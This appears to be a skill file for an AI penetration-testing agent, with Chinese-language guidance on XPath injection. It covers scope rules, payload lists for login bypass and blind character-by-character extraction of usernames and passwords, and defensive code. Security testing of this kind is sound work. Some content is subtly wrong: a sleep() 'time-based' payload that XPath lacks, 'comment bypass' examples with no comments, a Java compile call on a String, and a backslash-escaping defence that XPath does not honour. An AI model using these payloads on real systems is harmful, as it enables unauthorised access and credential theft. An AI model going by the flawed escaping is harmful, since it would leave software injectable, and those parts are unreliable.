---
name: antifox-xpath-injection-testing
description: "驗證 XPath 查詢組合、輸入處理與 XML 查詢授權（XPath injection）。"
license: AGPL-3.0
---

改寫自 [AntiFox / xpath-injection-testing](https://github.com/AntiFox-AI/antifox/blob/070f798bf590667bc2a0a13c687dd87d8a4413bf/skills/xpath-injection-testing/SKILL.md)（AGPL-3.0）。原文與授權見 `${SKILL_DIR}/references/source.md`、`${SKILL_DIR}/references/LICENSE`。

## ARTEX 整合約定

1. 本文件提供方法與範例。先用目前可用的工具 schema、已核准範圍及實際環境決定步驟；範例的主機、帳號、回應與程式片段不是目前目標的事實。不要照抄範例中的廣域掃描、資料傾印、破壞、關閉 TLS 驗證或停用驗證設定。
2. 外部 CLI、商業產品、MCP 與 Python 套件均須另查是否已安裝、綁定及可執行。技能清單與工具相依索引不代表工具已就緒。沿用 ARTEX 現有代理、範圍與操作審批；載入技能不增加權限。
3. 可先用 `search_knowledge` 在目前可見技能中找相關段落，再用 `Skill` 載入完整程序。檢索結果是參考資料，不會解鎖 MCP，也不是漏洞證據。
4. 已確認的發現交給現有 `report_finding`；使用本次工具輸出的實際證據，保留前置條件、操作、預期結果與觀察結果。未確認的假設寫為 fact/hint，並標記不確定性。平台對話沒有任務上下文時，用現有任務交接工具。
5. HTTP 流量只使用已核實的引用，遵守目前的流量綁定開關及報告流程。`finding_id` 與 `finding_node_id` 是不同編號，依實際工具說明使用。無確切流量時保留文字與命令證據，不猜編號或為補證據重打目標。

# XPath注入漏洞测试

## 概述

XPath注入是一种类似于SQL注入的漏洞，利用XPath查询语句的构造缺陷，可能导致信息泄露、认证绕过等。本技能提供XPath注入的检测、利用和防护方法。

## 漏洞原理

应用程序将用户输入直接拼接到XPath查询语句中，未进行充分验证和过滤，导致攻击者可以修改查询逻辑。

**危险代码示例：**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath基础

### 查询语法

**基础查询：**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### 函数

**常用函数：**
- `text()` - 获取文本内容
- `count()` - 计数
- `substring()` - 子字符串
- `string-length()` - 字符串长度
- `contains()` - 包含检查

## 测试方法

### 1. 识别XPath输入点

**常见功能：**
- 用户登录
- 数据搜索
- XML数据查询
- 配置查询

### 2. 基础检测

**测试特殊字符：**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**测试逻辑操作符：**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. 认证绕过

**基础绕过：**
```
用户名: admin' or '1'='1
密码: anything
查询: //user[username='admin' or '1'='1' and password='anything']
```

**更精确的绕过：**
```
用户名: admin') or ('1'='1
查询: //user[username='admin') or ('1'='1' and password='*']
```

### 4. 信息泄露

**枚举用户：**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**获取节点数量：**
```
' or count(//user)>0 or '
```

**获取特定节点：**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## 利用技术

### 认证绕过

**方法1：逻辑绕过**
```
输入: admin' or '1'='1
查询: //user[username='admin' or '1'='1' and password='*']
结果: 匹配所有用户
```

**方法2：注释绕过**
```
输入: admin')] | //* | //*[('
查询: //user[username='admin')] | //* | //*[('' and password='*']
```

**方法3：布尔盲注**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### 信息泄露

**枚举所有用户：**
```
' or 1=1 or '
结果: 返回所有用户节点
```

**获取用户名：**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
逐步获取每个字符
```

**获取密码：**
```
' or substring(//user[1]/password,1,1)='p' or '
逐步获取密码字符
```

### 盲注技术

**基于时间的盲注：**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**基于布尔值的盲注：**
```
' or substring(//user[1]/username,1,1)='a' or '
观察响应差异
```

## 绕过技术

### 编码绕过

**URL编码：**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML实体编码：**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### 注释绕过

**使用注释：**
```
' or 1=1 or '
' or '1'='1' or '
```

### 函数绕过

**使用不同函数：**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## 工具使用

### XPath表达式测试

**在线工具：**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. 拦截XPath查询请求
2. 修改查询参数
3. 观察响应结果

### Python脚本

```python
from lxml import etree
from lxml.etree import XPath

# 加载XML文档
doc = etree.parse('users.xml')

# 测试注入
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## 验证和报告

### 验证步骤

1. 确认可以控制XPath查询
2. 验证认证绕过或信息泄露
3. 评估影响（未授权访问、数据泄露等）
4. 记录完整的POC
5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议

### 报告要点

- 漏洞位置和输入参数
- XPath查询构造方式
- 完整的利用步骤和PoC
- 修复建议（输入验证、参数化查询等）

## 防护措施

### 推荐方案

1. **输入验证**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **参数化查询**
   ```java
   // 使用XPath变量
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **白名单验证**
   ```java
   // 只允许特定字符
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **使用预编译查询**
   ```java
   // 预定义查询模板
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // 使用参数绑定
   ```

5. **最小权限**
   - 限制XPath查询范围
   - 使用访问控制
   - 限制可查询的节点

## 注意事项

- 仅在授权测试环境中进行
- 注意不同XPath版本的语法差异
- 测试时避免对XML数据造成影响
- 了解目标应用的XPath实现
